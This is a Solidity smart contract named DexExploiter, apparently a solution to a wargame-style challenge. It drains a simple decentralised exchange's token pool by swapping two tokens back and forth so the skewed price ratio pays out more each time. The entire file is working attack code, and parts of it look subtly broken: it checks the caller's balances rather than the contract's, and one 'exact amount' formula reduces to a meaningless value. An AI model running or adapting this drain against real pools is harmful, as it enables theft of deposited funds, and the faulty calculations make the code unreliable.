// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function balanceOf(address token, address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract DexExploiter {
    IDex public immutable dex;
    
    constructor(address _dex) {
        dex = IDex(_dex);
    }
    
    function exploitDex() external {
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        require(token1 != address(0) && token2 != address(0), "Tokens not set");
        
        // First approve the DEX to spend our tokens
        dex.approve(address(dex), type(uint256).max);
        
        // Check initial balances
        uint256 myToken1 = dex.balanceOf(token1, msg.sender);
        uint256 myToken2 = dex.balanceOf(token2, msg.sender);
        
        // The vulnerability: we can drain the DEX by swapping back and forth
        // Each swap changes the price ratio in our favor
        
        // Swap 10 token1 for token2
        if (myToken1 >= 10) {
            dex.swap(token1, token2, 10);
        }
        
        // Now swap 20 token2 for token1 
        myToken2 = dex.balanceOf(token2, msg.sender);
        if (myToken2 >= 20) {
            dex.swap(token2, token1, 20);
        }
        
        // Continue swapping to drain the pool
        // Swap 24 token1 for token2
        myToken1 = dex.balanceOf(token1, msg.sender);
        if (myToken1 >= 24) {
            dex.swap(token1, token2, 24);
        }
        
        // Swap 30 token2 for token1
        myToken2 = dex.balanceOf(token2, msg.sender);
        if (myToken2 >= 30) {
            dex.swap(token2, token1, 30);
        }
        
        // Swap 41 token1 for token2
        myToken1 = dex.balanceOf(token1, msg.sender);
        if (myToken1 >= 41) {
            dex.swap(token1, token2, 41);
        }
        
        // Final swap to drain token2 completely
        myToken2 = dex.balanceOf(token2, msg.sender);
        
        // Calculate exact amount needed to drain token1
        uint256 dexToken1 = dex.balanceOf(token1, address(dex));
        uint256 dexToken2 = dex.balanceOf(token2, address(dex));
        
        if (dexToken1 > 0) {
            // We need to swap exactly the amount that will give us all remaining token1
            uint256 swapAmount = dexToken2;
            if (swapAmount > myToken2) {
                swapAmount = myToken2;
            }
            
            // Check if this amount would drain the pool
            uint256 expectedReceive = dex.getSwapPrice(token2, token1, swapAmount);
            if (expectedReceive >= dexToken1) {
                // Calculate exact amount to drain
                swapAmount = (dexToken1 * dexToken2) / dexToken1;
                if (swapAmount > myToken2) {
                    swapAmount = myToken2;
                }
            }
            
            if (swapAmount > 0) {
                dex.swap(token2, token1, swapAmount);
            }
        }
    }
    
    function directExploit() external {
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        require(token1 != address(0) && token2 != address(0), "Tokens not set");
        
        // Approve max spending
        dex.approve(address(dex), type(uint256).max);
        
        // Execute the optimal sequence to drain a token
        // Based on starting with 10 of each token and DEX having 100 of each
        
        dex.swap(token1, token2, 10);  // Get 10 token2
        dex.swap(token2, token1, 20);  // Get 24 token1  
        dex.swap(token1, token2, 24);  // Get 30 token2
        dex.swap(token2, token1, 30);  // Get 41 token1
        dex.swap(token1, token2, 41);  // Get 65 token2
        
        // Final swap to drain remaining token1
        uint256 dexToken1Balance = dex.balanceOf(token1, address(dex));
        uint256 myToken2Balance = dex.balanceOf(token2, msg.sender);
        
        // Calculate amount to swap to get all remaining token1
        uint256 amountToSwap = dexToken1Balance < myToken2Balance ? dexToken1Balance : 45;
        dex.swap(token2, token1, amountToSwap);
    }
}